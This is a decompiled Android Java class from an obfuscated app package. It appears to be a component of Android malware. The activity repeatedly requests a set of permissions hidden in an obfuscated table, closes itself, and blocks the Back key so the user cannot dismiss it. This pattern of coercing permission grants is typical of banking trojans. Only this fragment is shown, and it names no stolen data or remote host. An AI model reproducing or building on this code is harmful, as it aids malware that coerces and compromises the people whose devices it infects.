package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.view.KeyEvent;
import wocwvy.czyxoxmbauu.slsa.C0033a;
import wocwvy.czyxoxmbauu.slsa.C0034b;

public class sxfl extends Activity {

    /* renamed from: a */
    C0033a f471a = new C0033a();

    /* renamed from: b */
    C0034b f472b = new C0034b();

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (this.f472b.mo235e(this)) {
            finish();
        }
        if (VERSION.SDK_INT >= 23) {
            if (checkCallingOrSelfPermission(this.f471a.f337d[0]) != 0) {
                requestPermissions(this.f471a.f337d, 111);
            }
            if (checkCallingOrSelfPermission(this.f471a.f338e[0]) != 0) {
                requestPermissions(this.f471a.f338e, 111);
            }
            if (checkCallingOrSelfPermission(this.f471a.f339f[0]) != 0) {
                requestPermissions(this.f471a.f339f, 111);
            }
            if (checkCallingOrSelfPermission(this.f471a.f340g[0]) != 0) {
                requestPermissions(this.f471a.f340g, 111);
            }
            if (checkCallingOrSelfPermission(this.f471a.f336c[0]) != 0) {
                requestPermissions(this.f471a.f336c, 111);
            }
            if (checkCallingOrSelfPermission(this.f471a.f335b[0]) != 0) {
                requestPermissions(this.f471a.f335b, 111);
            }
        }
        finish();
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 4 || super.onKeyDown(i, keyEvent);
    }

    /* access modifiers changed from: protected */
    public void onPause() {
        super.onPause();
    }

    /* access modifiers changed from: protected */
    public void onResume() {
        super.onResume();
    }

    /* access modifiers changed from: protected */
    public void onStop() {
        super.onStop();
    }
}
